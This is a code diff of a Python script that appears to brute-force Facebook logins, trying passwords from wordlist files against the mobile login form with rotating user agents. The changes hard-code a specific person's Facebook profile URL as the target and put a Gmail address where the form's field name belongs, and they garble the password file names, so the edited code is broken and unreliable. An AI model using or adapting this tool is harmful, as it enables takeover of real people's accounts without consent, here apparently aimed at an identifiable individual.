@@ -60,9 +60,9 @@ def cover():
 
 cover()
 
-email = str(raw_input(GL+" â€¢Introduzca la ID del objetivo\033[33;1m: "))
+email = str(raw_input(GL+" https://www.facebook.com/armin.buuren.5011 "))
 
-passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass.txt, pass1.txt, pass2.txt, pass3.txt ] \033[92;1m: "))
+passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass. 033, pass1. 033, pass2. 033, pass3. 033 ] \033[92;1m: "))
 
 
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
@@ -114,7 +114,7 @@ def brute(password):
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
         br.select_form(nr = 0)
-        br.form['email'] = email
+        br.form[' jl1807073@gmail.com'] = email
         br.form['pass'] = password
         sub = br.submit()
         log = sub.geturl()
